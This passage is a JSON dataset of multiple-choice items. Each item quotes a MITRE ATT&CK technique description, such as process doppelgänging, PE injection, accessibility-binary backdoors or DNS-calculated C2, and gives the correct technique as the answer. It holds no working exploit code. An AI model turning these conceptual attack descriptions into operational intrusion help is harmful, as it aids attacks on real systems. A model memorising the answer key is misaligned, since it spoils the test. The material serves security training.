      "options": "A. Search Open Technical Databases: Digital Certificates, B. Gather Victim Host Information: Hardware, C. Remote Services: SSH, D. Indirect Command Execution",
      "choice": "B. Gather Victim Host Information: Hardware",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Answer which mitre technique is related to the description: Adversaries may perform calculations on addresses returned in DNS results to determine which port and IP address to use for command and control, rather than relying on a predetermined port number or the actual returned IP address. A IP and/or port number calculation can be used to bypass egress filtering on a C2 channel.\n\nOne implementation of DNS Calculation is to take the first three octets of an IP address in a DNS response and use those values to calculate the port for command and control traffic.\n\nPossible answers:\nA. Data from Information Repositories: Code Repositories, B. Boot or Logon Autostart Execution: Shortcut Modification, C. Obtain Capabilities: Tool, D. Dynamic Resolution: DNS Calculation",
    "context": "",
    "output": "D. Dynamic Resolution: DNS Calculation",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Answer which mitre technique is related to the description: Adversaries may perform calculations on addresses returned in DNS results to determine which port and IP address to use for command and control, rather than relying on a predetermined port number or the actual returned IP address. A IP and/or port number calculation can be used to bypass egress filtering on a C2 channel.\n\nOne implementation of DNS Calculation is to take the first three octets of an IP address in a DNS response and use those values to calculate the port for command and control traffic.",
      "options": "A. Data from Information Repositories: Code Repositories, B. Boot or Logon Autostart Execution: Shortcut Modification, C. Obtain Capabilities: Tool, D. Dynamic Resolution: DNS Calculation",
      "choice": "D. Dynamic Resolution: DNS Calculation",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may exploit software vulnerabilities in an attempt to elevate privileges. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. Security constructs such as permission levels will often hinder access to information and use of certain techniques, so adversaries will likely need to perform privilege escalation to include use of software exploitation to circumvent those restrictions.\n\nWhen initially gaining access to a system, an adversary may be operating within a lower privileged process which will prevent them from accessing certain resources on the system. Vulnerabilities may exist, usually in operating system components and software commonly running at higher permissions, that can be exploited to gain higher levels of access on the system. This could enable someone to move from unprivileged or user level permissions to SYSTEM or root permissions depending on the component that is vulnerable. This could also enable an adversary to move from a virtualized environment, such as within a virtual machine or container, onto the underlying host. This may be a necessary step for an adversary compromising an endpoint system that has been properly configured and limits other privilege escalation methods.\n\nAdversaries may bring a signed vulnerable driver onto a compromised machine so that they can exploit the vulnerability to execute code in kernel mode. This process is sometimes referred to as Bring Your Own Vulnerable Driver (BYOVD). Adversaries may include the vulnerable driver with files delivered during Initial Access or download it to a compromised system via Ingress Tool Transfer or Lateral Tool Transfer.\n\nA. External Remote Services, B. Obfuscated Files or Information: Stripped Payloads, C. Exploitation for Privilege Escalation, D. Stage Capabilities\nAnswer:",
    "context": "",
    "output": "C. Exploitation for Privilege Escalation",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may exploit software vulnerabilities in an attempt to elevate privileges. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. Security constructs such as permission levels will often hinder access to information and use of certain techniques, so adversaries will likely need to perform privilege escalation to include use of software exploitation to circumvent those restrictions.\n\nWhen initially gaining access to a system, an adversary may be operating within a lower privileged process which will prevent them from accessing certain resources on the system. Vulnerabilities may exist, usually in operating system components and software commonly running at higher permissions, that can be exploited to gain higher levels of access on the system. This could enable someone to move from unprivileged or user level permissions to SYSTEM or root permissions depending on the component that is vulnerable. This could also enable an adversary to move from a virtualized environment, such as within a virtual machine or container, onto the underlying host. This may be a necessary step for an adversary compromising an endpoint system that has been properly configured and limits other privilege escalation methods.\n\nAdversaries may bring a signed vulnerable driver onto a compromised machine so that they can exploit the vulnerability to execute code in kernel mode. This process is sometimes referred to as Bring Your Own Vulnerable Driver (BYOVD). Adversaries may include the vulnerable driver with files delivered during Initial Access or download it to a compromised system via Ingress Tool Transfer or Lateral Tool Transfer.",
      "options": "A. External Remote Services, B. Obfuscated Files or Information: Stripped Payloads, C. Exploitation for Privilege Escalation, D. Stage Capabilities",
      "choice": "C. Exploitation for Privilege Escalation",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Question: Answer which mitre technique is related to the description: Adversaries may inject malicious code into process via process doppelg\u00e4nging in order to evade process-based defenses as well as possibly elevate privileges. Process doppelg\u00e4nging is a method of executing arbitrary code in the address space of a separate live process. \n\nWindows Transactional NTFS (TxF) was introduced in Vista as a method to perform safe file operations.  To ensure data integrity, TxF enables only one transacted handle to write to a file at a given time. Until the write handle transaction is terminated, all other handles are isolated from the writer and may only read the committed version of the file that existed at the time the handle was opened.  To avoid corruption, TxF performs an automatic rollback if the system or application fails during a write transaction. \n\nAlthough deprecated, the TxF application programming interface (API) is still enabled as of Windows 10. \n\nAdversaries may abuse TxF to a perform a file-less variation of Process Injection. Similar to Process Hollowing, process doppelg\u00e4nging involves replacing the memory of a legitimate process, enabling the veiled execution of malicious code that may evade defenses and detection. Process doppelg\u00e4nging's use of TxF also avoids the use of highly-monitored API functions such as <code>NtUnmapViewOfSection</code>, <code>VirtualProtectEx</code>, and <code>SetThreadContext</code>. \n\nProcess Doppelg\u00e4nging is implemented in 4 steps :\n\n* Transact \u2013 Create a TxF transaction using a legitimate executable then overwrite the file with malicious code. These changes will be isolated and only visible within the context of the transaction.\n* Load \u2013 Create a shared section of memory and load the malicious executable.\n* Rollback \u2013 Undo changes to original executable, effectively removing malicious code from the file system.\n* Animate \u2013 Create a process from the tainted section of memory and initiate execution.\n\nThis behavior will likely not result in elevated privileges since the injected process was spawned from (and thus inherits the security context) of the injecting process. However, execution via process doppelg\u00e4nging may evade detection from security products since the execution is masked under a legitimate process.\nA. Process Injection: Process Doppelg\u00e4nging, B. Command and Scripting Interpreter: Network Device CLI, C. OS Credential Dumping, D. Communication Through Removable Media\nAnswer:",
    "context": "",
    "output": "A. Process Injection: Process Doppelg\u00e4nging",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Answer which mitre technique is related to the description: Adversaries may inject malicious code into process via process doppelg\u00e4nging in order to evade process-based defenses as well as possibly elevate privileges. Process doppelg\u00e4nging is a method of executing arbitrary code in the address space of a separate live process. \n\nWindows Transactional NTFS (TxF) was introduced in Vista as a method to perform safe file operations.  To ensure data integrity, TxF enables only one transacted handle to write to a file at a given time. Until the write handle transaction is terminated, all other handles are isolated from the writer and may only read the committed version of the file that existed at the time the handle was opened.  To avoid corruption, TxF performs an automatic rollback if the system or application fails during a write transaction. \n\nAlthough deprecated, the TxF application programming interface (API) is still enabled as of Windows 10. \n\nAdversaries may abuse TxF to a perform a file-less variation of Process Injection. Similar to Process Hollowing, process doppelg\u00e4nging involves replacing the memory of a legitimate process, enabling the veiled execution of malicious code that may evade defenses and detection. Process doppelg\u00e4nging's use of TxF also avoids the use of highly-monitored API functions such as <code>NtUnmapViewOfSection</code>, <code>VirtualProtectEx</code>, and <code>SetThreadContext</code>. \n\nProcess Doppelg\u00e4nging is implemented in 4 steps :\n\n* Transact \u2013 Create a TxF transaction using a legitimate executable then overwrite the file with malicious code. These changes will be isolated and only visible within the context of the transaction.\n* Load \u2013 Create a shared section of memory and load the malicious executable.\n* Rollback \u2013 Undo changes to original executable, effectively removing malicious code from the file system.\n* Animate \u2013 Create a process from the tainted section of memory and initiate execution.\n\nThis behavior will likely not result in elevated privileges since the injected process was spawned from (and thus inherits the security context) of the injecting process. However, execution via process doppelg\u00e4nging may evade detection from security products since the execution is masked under a legitimate process.",
      "options": "A. Process Injection: Process Doppelg\u00e4nging, B. Command and Scripting Interpreter: Network Device CLI, C. OS Credential Dumping, D. Communication Through Removable Media",
      "choice": "A. Process Injection: Process Doppelg\u00e4nging",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may establish persistence and/or elevate privileges by executing malicious content triggered by accessibility features. Windows contains accessibility features that may be launched with a key combination before a user has logged in (ex: when the user is on the Windows logon screen). An adversary can modify the way these programs are launched to get a command prompt or backdoor without logging in to the system.\n\nTwo common accessibility programs are <code>C:\\Windows\\System32\\sethc.exe</code>, launched when the shift key is pressed five times and <code>C:\\Windows\\System32\\utilman.exe</code>, launched when the Windows + U key combination is pressed. The sethc.exe program is often referred to as \"sticky keys\", and has been used by adversaries for unauthenticated access through a remote desktop login screen. \n\nDepending on the version of Windows, an adversary may take advantage of these features in different ways. Common methods used by adversaries include replacing accessibility feature binaries or pointers/references to these binaries in the Registry. In newer versions of Windows, the replaced binary needs to be digitally signed for x64 systems, the binary must reside in <code>%systemdir%\\</code>, and it must be protected by Windows File or Resource Protection (WFP/WRP).  The Image File Execution Options Injection debugger method was likely discovered as a potential workaround because it does not require the corresponding accessibility feature binary to be replaced.\n\nFor simple binary replacement on Windows XP and later as well as and Windows Server 2003/R2 and later, for example, the program (e.g., <code>C:\\Windows\\System32\\utilman.exe</code>) may be replaced with \"cmd.exe\" (or another program that provides backdoor access). Subsequently, pressing the appropriate key combination at the login screen while sitting at the keyboard or when connected over Remote Desktop Protocol will cause the replaced file to be executed with SYSTEM privileges. \n\nOther accessibility features exist that may also be leveraged in a similar fashion: \n\n* On-Screen Keyboard: <code>C:\\Windows\\System32\\osk.exe</code>\n* Magnifier: <code>C:\\Windows\\System32\\Magnify.exe</code>\n* Narrator: <code>C:\\Windows\\System32\\Narrator.exe</code>\n* Display Switcher: <code>C:\\Windows\\System32\\DisplaySwitch.exe</code>\n* App Switcher: <code>C:\\Windows\\System32\\AtBroker.exe</code>\nA. Supply Chain Compromise: Compromise Hardware Supply Chain, B. Event Triggered Execution: Accessibility Features, C. Gather Victim Network Information: DNS, D. Impair Defenses: Impair Command History Logging",
    "context": "",
    "output": "B. Event Triggered Execution: Accessibility Features",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may establish persistence and/or elevate privileges by executing malicious content triggered by accessibility features. Windows contains accessibility features that may be launched with a key combination before a user has logged in (ex: when the user is on the Windows logon screen). An adversary can modify the way these programs are launched to get a command prompt or backdoor without logging in to the system.\n\nTwo common accessibility programs are <code>C:\\Windows\\System32\\sethc.exe</code>, launched when the shift key is pressed five times and <code>C:\\Windows\\System32\\utilman.exe</code>, launched when the Windows + U key combination is pressed. The sethc.exe program is often referred to as \"sticky keys\", and has been used by adversaries for unauthenticated access through a remote desktop login screen. \n\nDepending on the version of Windows, an adversary may take advantage of these features in different ways. Common methods used by adversaries include replacing accessibility feature binaries or pointers/references to these binaries in the Registry. In newer versions of Windows, the replaced binary needs to be digitally signed for x64 systems, the binary must reside in <code>%systemdir%\\</code>, and it must be protected by Windows File or Resource Protection (WFP/WRP).  The Image File Execution Options Injection debugger method was likely discovered as a potential workaround because it does not require the corresponding accessibility feature binary to be replaced.\n\nFor simple binary replacement on Windows XP and later as well as and Windows Server 2003/R2 and later, for example, the program (e.g., <code>C:\\Windows\\System32\\utilman.exe</code>) may be replaced with \"cmd.exe\" (or another program that provides backdoor access). Subsequently, pressing the appropriate key combination at the login screen while sitting at the keyboard or when connected over Remote Desktop Protocol will cause the replaced file to be executed with SYSTEM privileges. \n\nOther accessibility features exist that may also be leveraged in a similar fashion: \n\n* On-Screen Keyboard: <code>C:\\Windows\\System32\\osk.exe</code>\n* Magnifier: <code>C:\\Windows\\System32\\Magnify.exe</code>\n* Narrator: <code>C:\\Windows\\System32\\Narrator.exe</code>\n* Display Switcher: <code>C:\\Windows\\System32\\DisplaySwitch.exe</code>\n* App Switcher: <code>C:\\Windows\\System32\\AtBroker.exe</code>",
      "options": "A. Supply Chain Compromise: Compromise Hardware Supply Chain, B. Event Triggered Execution: Accessibility Features, C. Gather Victim Network Information: DNS, D. Impair Defenses: Impair Command History Logging",
      "choice": "B. Event Triggered Execution: Accessibility Features",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may abuse control.exe to proxy execution of malicious payloads. The Windows Control Panel process binary (control.exe) handles execution of Control Panel items, which are utilities that allow users to view and adjust computer settings.\n\nControl Panel items are registered executable (.exe) or Control Panel (.cpl) files, the latter are actually renamed dynamic-link library (.dll) files that export a <code>CPlApplet</code> function. For ease of use, Control Panel items typically include graphical menus available to users after being registered and loaded into the Control Panel. Control Panel items can be executed directly from the command line, programmatically via an application programming interface (API) call, or by simply double-clicking the file. \n\nMalicious Control Panel items can be delivered via Phishing campaigns or executed as part of multi-stage malware. Control Panel items, specifically CPL files, may also bypass application and/or file extension allow lists.\n\nAdversaries may also rename malicious DLL files (.dll) with Control Panel file extensions (.cpl) and register them to <code>HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Control Panel\\Cpls</code>. Even when these registered DLLs do not comply with the CPL file specification and do not export <code>CPlApplet</code> functions, they are loaded and executed through its <code>DllEntryPoint</code> when Control Panel is executed. CPL files not exporting <code>CPlApplet</code> are not directly executable.\n\nPossible answers:\nA. Event Triggered Execution: Netsh Helper DLL, B. Endpoint Denial of Service: Service Exhaustion Flood, C. Endpoint Denial of Service: Application or System Exploitation, D. System Binary Proxy Execution: Control Panel",
    "context": "",
    "output": "D. System Binary Proxy Execution: Control Panel",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may abuse control.exe to proxy execution of malicious payloads. The Windows Control Panel process binary (control.exe) handles execution of Control Panel items, which are utilities that allow users to view and adjust computer settings.\n\nControl Panel items are registered executable (.exe) or Control Panel (.cpl) files, the latter are actually renamed dynamic-link library (.dll) files that export a <code>CPlApplet</code> function. For ease of use, Control Panel items typically include graphical menus available to users after being registered and loaded into the Control Panel. Control Panel items can be executed directly from the command line, programmatically via an application programming interface (API) call, or by simply double-clicking the file. \n\nMalicious Control Panel items can be delivered via Phishing campaigns or executed as part of multi-stage malware. Control Panel items, specifically CPL files, may also bypass application and/or file extension allow lists.\n\nAdversaries may also rename malicious DLL files (.dll) with Control Panel file extensions (.cpl) and register them to <code>HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Control Panel\\Cpls</code>. Even when these registered DLLs do not comply with the CPL file specification and do not export <code>CPlApplet</code> functions, they are loaded and executed through its <code>DllEntryPoint</code> when Control Panel is executed. CPL files not exporting <code>CPlApplet</code> are not directly executable.",
      "options": "A. Event Triggered Execution: Netsh Helper DLL, B. Endpoint Denial of Service: Service Exhaustion Flood, C. Endpoint Denial of Service: Application or System Exploitation, D. System Binary Proxy Execution: Control Panel",
      "choice": "D. System Binary Proxy Execution: Control Panel",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may execute malicious payloads via loading the technique. Shared modules are executable files that are loaded into processes to provide access to reusable code, such as specific custom functions or invoking OS API functions (i.e., Native API).\n\nAdversaries may use this functionality as a way to execute arbitrary payloads on a victim system. For example, adversaries can modularize functionality of their malware into shared objects that perform various functions such as managing C2 network communications or execution of specific actions on objective.\n\nThe Linux & macOS module loader can load and execute shared objects from arbitrary local paths. This functionality resides in `dlfcn.h` in functions such as `dlopen` and `dlsym`. Although macOS can execute `.so` files, common practice uses `.dylib` files.\n\nThe Windows module loader can be instructed to load DLLs from arbitrary local paths and arbitrary Universal Naming Convention (UNC) network paths. This functionality resides in `NTDLL.dll` and is part of the Windows Native API which is called from functions like `LoadLibrary` at run time.\n\nPossible answers:\nA. Supply Chain Compromise: Compromise Software Supply Chain, B. Obfuscated Files or Information: LNK Icon Smuggling, C. Modify System Image: Patch System Image, D. Shared Modules",
    "context": "",
    "output": "D. Shared Modules",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may execute malicious payloads via loading the technique. Shared modules are executable files that are loaded into processes to provide access to reusable code, such as specific custom functions or invoking OS API functions (i.e., Native API).\n\nAdversaries may use this functionality as a way to execute arbitrary payloads on a victim system. For example, adversaries can modularize functionality of their malware into shared objects that perform various functions such as managing C2 network communications or execution of specific actions on objective.\n\nThe Linux & macOS module loader can load and execute shared objects from arbitrary local paths. This functionality resides in `dlfcn.h` in functions such as `dlopen` and `dlsym`. Although macOS can execute `.so` files, common practice uses `.dylib` files.\n\nThe Windows module loader can be instructed to load DLLs from arbitrary local paths and arbitrary Universal Naming Convention (UNC) network paths. This functionality resides in `NTDLL.dll` and is part of the Windows Native API which is called from functions like `LoadLibrary` at run time.",
      "options": "A. Supply Chain Compromise: Compromise Software Supply Chain, B. Obfuscated Files or Information: LNK Icon Smuggling, C. Modify System Image: Patch System Image, D. Shared Modules",
      "choice": "D. Shared Modules",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may reduce the level of effort required to decrypt data transmitted over the network by reducing the cipher strength of encrypted communications.\n\nAdversaries can weaken the encryption software on a compromised network device by reducing the key size used by the software to convert plaintext to ciphertext (e.g., from hundreds or thousands of bytes to just a couple of bytes). As a result, adversaries dramatically reduce the amount of effort needed to decrypt the protected information without the key.\n\nAdversaries may modify the key size used and other encryption parameters using specialized commands in a Network Device CLI introduced to the system through Modify System Image to change the configuration of the device.\n\nA. Modify Cloud Compute Infrastructure: Create Snapshot, B. Phishing, C. Weaken Encryption: Reduce Key Space, D. Video Capture\nAnswer:",
    "context": "",
    "output": "C. Weaken Encryption: Reduce Key Space",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may reduce the level of effort required to decrypt data transmitted over the network by reducing the cipher strength of encrypted communications.\n\nAdversaries can weaken the encryption software on a compromised network device by reducing the key size used by the software to convert plaintext to ciphertext (e.g., from hundreds or thousands of bytes to just a couple of bytes). As a result, adversaries dramatically reduce the amount of effort needed to decrypt the protected information without the key.\n\nAdversaries may modify the key size used and other encryption parameters using specialized commands in a Network Device CLI introduced to the system through Modify System Image to change the configuration of the device.",
      "options": "A. Modify Cloud Compute Infrastructure: Create Snapshot, B. Phishing, C. Weaken Encryption: Reduce Key Space, D. Video Capture",
      "choice": "C. Weaken Encryption: Reduce Key Space",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Answer which mitre technique is related to the description: Adversaries may execute commands and perform malicious tasks using AutoIT and AutoHotKey automation scripts. AutoIT and AutoHotkey (AHK) are scripting languages that enable users to automate Windows tasks. These automation scripts can be used to perform a wide variety of actions, such as clicking on buttons, entering text, and opening and closing programs.\n\nAdversaries may use AHK (`.ahk`) and AutoIT (`.au3`) scripts to execute malicious code on a victim's system. For example, adversaries have used for AHK to execute payloads and other modular malware such as keyloggers. Adversaries have also used custom AHK files containing embedded malware as Phishing payloads.\n\nThese scripts may also be compiled into self-contained executable payloads (`.exe`).\n\nPossible answers:\nA. Group Policy Discovery, B. Event Triggered Execution: Change Default File Association, C. Steal or Forge Authentication Certificates, D. Command and Scripting Interpreter: AutoHotKey & AutoIT",
    "context": "",
    "output": "D. Command and Scripting Interpreter: AutoHotKey & AutoIT",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Answer which mitre technique is related to the description: Adversaries may execute commands and perform malicious tasks using AutoIT and AutoHotKey automation scripts. AutoIT and AutoHotkey (AHK) are scripting languages that enable users to automate Windows tasks. These automation scripts can be used to perform a wide variety of actions, such as clicking on buttons, entering text, and opening and closing programs.\n\nAdversaries may use AHK (`.ahk`) and AutoIT (`.au3`) scripts to execute malicious code on a victim's system. For example, adversaries have used for AHK to execute payloads and other modular malware such as keyloggers. Adversaries have also used custom AHK files containing embedded malware as Phishing payloads.\n\nThese scripts may also be compiled into self-contained executable payloads (`.exe`).",
      "options": "A. Group Policy Discovery, B. Event Triggered Execution: Change Default File Association, C. Steal or Forge Authentication Certificates, D. Command and Scripting Interpreter: AutoHotKey & AutoIT",
      "choice": "D. Command and Scripting Interpreter: AutoHotKey & AutoIT",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may leverage information repositories to mine valuable information. Information repositories are tools that allow for storage of information, typically to facilitate collaboration or information sharing between users, and can store a wide variety of data that may aid adversaries in further objectives, or direct access to the target information. Adversaries may also abuse external sharing features to share sensitive documents with recipients outside of the organization. \n\nThe following is a brief list of example information that may hold potential value to an adversary and may also be found on an information repository:\n\n* Policies, procedures, and standards\n* Physical / logical network diagrams\n* System architecture diagrams\n* Technical system documentation\n* Testing / development credentials\n* Work / project schedules\n* Source code snippets\n* Links to network shares and other internal resources\n\nInformation stored in a repository may vary based on the specific instance or environment. Specific common information repositories include web-based platforms such as Sharepoint and Confluence, specific services such as Code Repositories, IaaS databases, enterprise databases, and other storage infrastructure such as SQL Server.\n\nA. Data from Information Repositories, B. Application Layer Protocol: Mail Protocols, C. Process Injection: Proc Memory, D. Account Manipulation: Additional Email Delegate Permissions\nAnswer:",
    "context": "",
    "output": "A. Data from Information Repositories",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may leverage information repositories to mine valuable information. Information repositories are tools that allow for storage of information, typically to facilitate collaboration or information sharing between users, and can store a wide variety of data that may aid adversaries in further objectives, or direct access to the target information. Adversaries may also abuse external sharing features to share sensitive documents with recipients outside of the organization. \n\nThe following is a brief list of example information that may hold potential value to an adversary and may also be found on an information repository:\n\n* Policies, procedures, and standards\n* Physical / logical network diagrams\n* System architecture diagrams\n* Technical system documentation\n* Testing / development credentials\n* Work / project schedules\n* Source code snippets\n* Links to network shares and other internal resources\n\nInformation stored in a repository may vary based on the specific instance or environment. Specific common information repositories include web-based platforms such as Sharepoint and Confluence, specific services such as Code Repositories, IaaS databases, enterprise databases, and other storage infrastructure such as SQL Server.",
      "options": "A. Data from Information Repositories, B. Application Layer Protocol: Mail Protocols, C. Process Injection: Proc Memory, D. Account Manipulation: Additional Email Delegate Permissions",
      "choice": "A. Data from Information Repositories",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may buy, steal, or download malware that can be used during targeting. Malicious software can include payloads, droppers, post-compromise tools, backdoors, packers, and C2 protocols. Adversaries may acquire malware to support their operations, obtaining a means for maintaining control of remote machines, evading defenses, and executing post-compromise behaviors.\n\nIn addition to downloading free malware from the internet, adversaries may purchase these capabilities from third-party entities. Third-party entities can include technology companies that specialize in malware development, criminal marketplaces (including Malware-as-a-Service, or MaaS), or from individuals. In addition to purchasing malware, adversaries may steal and repurpose malware from third-party entities (including other adversaries).\n\nA. Search Open Websites/Domains: Search Engines, B. Network Denial of Service: Reflection Amplification, C. Obtain Capabilities: Malware, D. Forge Web Credentials: SAML Tokens\nAnswer:",
    "context": "",
    "output": "C. Obtain Capabilities: Malware",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may buy, steal, or download malware that can be used during targeting. Malicious software can include payloads, droppers, post-compromise tools, backdoors, packers, and C2 protocols. Adversaries may acquire malware to support their operations, obtaining a means for maintaining control of remote machines, evading defenses, and executing post-compromise behaviors.\n\nIn addition to downloading free malware from the internet, adversaries may purchase these capabilities from third-party entities. Third-party entities can include technology companies that specialize in malware development, criminal marketplaces (including Malware-as-a-Service, or MaaS), or from individuals. In addition to purchasing malware, adversaries may steal and repurpose malware from third-party entities (including other adversaries).",
      "options": "A. Search Open Websites/Domains: Search Engines, B. Network Denial of Service: Reflection Amplification, C. Obtain Capabilities: Malware, D. Forge Web Credentials: SAML Tokens",
      "choice": "C. Obtain Capabilities: Malware",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Q: Answer which mitre technique is related to the description: Adversaries may interact with the native OS application programming interface (API) to execute behaviors. The techniques provide a controlled means of calling low-level OS services within the kernel, such as those involving hardware/devices, memory, and processes. These native APIs are leveraged by the OS during system boot (when other system components are not yet initialized) as well as carrying out tasks and requests during routine operations.\n\nAdversaries may abuse these OS API functions as a means of executing behaviors. Similar to Command and Scripting Interpreter, the native API and its hierarchy of interfaces provide mechanisms to interact with and utilize various components of a victimized system.\n\nThe technique functions (such as <code>NtCreateProcess</code>) may be directed invoked via system calls / syscalls, but these features are also often exposed to user-mode applications via interfaces and libraries. For example, functions such as the Windows API <code>CreateProcess()</code> or GNU <code>fork()</code> will allow programs and scripts to start other processes. This may allow API callers to execute a binary, run a CLI command, load modules, etc. as thousands of similar API functions exist for various system operations.\n\nHigher level software frameworks, such as Microsoft .NET and macOS Cocoa, are also available to interact with native APIs. These frameworks typically provide language wrappers/abstractions to API functionalities and are designed for ease-of-use/portability of code.\n\nAdversaries may use assembly to directly or in-directly invoke syscalls in an attempt to subvert defensive sensors and detection signatures such as user mode API-hooks. Adversaries may also attempt to tamper with sensors and defensive tools associated with API monitoring, such as unhooking monitored functions via Disable or Modify Tools.\n\nOptions:\nA. Acquire Access, B. Application Layer Protocol: DNS, C. Email Collection: Email Forwarding Rule, D. Native API",
    "context": "",
    "output": "D. Native API",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Answer which mitre technique is related to the description: Adversaries may interact with the native OS application programming interface (API) to execute behaviors. The techniques provide a controlled means of calling low-level OS services within the kernel, such as those involving hardware/devices, memory, and processes. These native APIs are leveraged by the OS during system boot (when other system components are not yet initialized) as well as carrying out tasks and requests during routine operations.\n\nAdversaries may abuse these OS API functions as a means of executing behaviors. Similar to Command and Scripting Interpreter, the native API and its hierarchy of interfaces provide mechanisms to interact with and utilize various components of a victimized system.\n\nThe technique functions (such as <code>NtCreateProcess</code>) may be directed invoked via system calls / syscalls, but these features are also often exposed to user-mode applications via interfaces and libraries. For example, functions such as the Windows API <code>CreateProcess()</code> or GNU <code>fork()</code> will allow programs and scripts to start other processes. This may allow API callers to execute a binary, run a CLI command, load modules, etc. as thousands of similar API functions exist for various system operations.\n\nHigher level software frameworks, such as Microsoft .NET and macOS Cocoa, are also available to interact with native APIs. These frameworks typically provide language wrappers/abstractions to API functionalities and are designed for ease-of-use/portability of code.\n\nAdversaries may use assembly to directly or in-directly invoke syscalls in an attempt to subvert defensive sensors and detection signatures such as user mode API-hooks. Adversaries may also attempt to tamper with sensors and defensive tools associated with API monitoring, such as unhooking monitored functions via Disable or Modify Tools.",
      "options": "A. Acquire Access, B. Application Layer Protocol: DNS, C. Email Collection: Email Forwarding Rule, D. Native API",
      "choice": "D. Native API",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Answer which mitre technique is related to the description: Adversaries may inject portable executables (PE) into processes in order to evade process-based defenses as well as possibly elevate privileges. PE injection is a method of executing arbitrary code in the address space of a separate live process. \n\nPE injection is commonly performed by copying code (perhaps without a file on disk) into the virtual address space of the target process before invoking it via a new thread. The write can be performed with native Windows API calls such as <code>VirtualAllocEx</code> and <code>WriteProcessMemory</code>, then invoked with <code>CreateRemoteThread</code> or additional code (ex: shellcode). The displacement of the injected code does introduce the additional requirement for functionality to remap memory references.  \n\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via PE injection may also evade detection from security products since the execution is masked under a legitimate process.\n\nA. Search Open Websites/Domains, B. Process Injection: Portable Executable Injection, C. Masquerading: Invalid Code Signature, D. Boot or Logon Autostart Execution: Login Items\nAnswer:",
    "context": "",
    "output": "B. Process Injection: Portable Executable Injection",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Answer which mitre technique is related to the description: Adversaries may inject portable executables (PE) into processes in order to evade process-based defenses as well as possibly elevate privileges. PE injection is a method of executing arbitrary code in the address space of a separate live process. \n\nPE injection is commonly performed by copying code (perhaps without a file on disk) into the virtual address space of the target process before invoking it via a new thread. The write can be performed with native Windows API calls such as <code>VirtualAllocEx</code> and <code>WriteProcessMemory</code>, then invoked with <code>CreateRemoteThread</code> or additional code (ex: shellcode). The displacement of the injected code does introduce the additional requirement for functionality to remap memory references.  \n\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via PE injection may also evade detection from security products since the execution is masked under a legitimate process.",
      "options": "A. Search Open Websites/Domains, B. Process Injection: Portable Executable Injection, C. Masquerading: Invalid Code Signature, D. Boot or Logon Autostart Execution: Login Items",
      "choice": "B. Process Injection: Portable Executable Injection",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
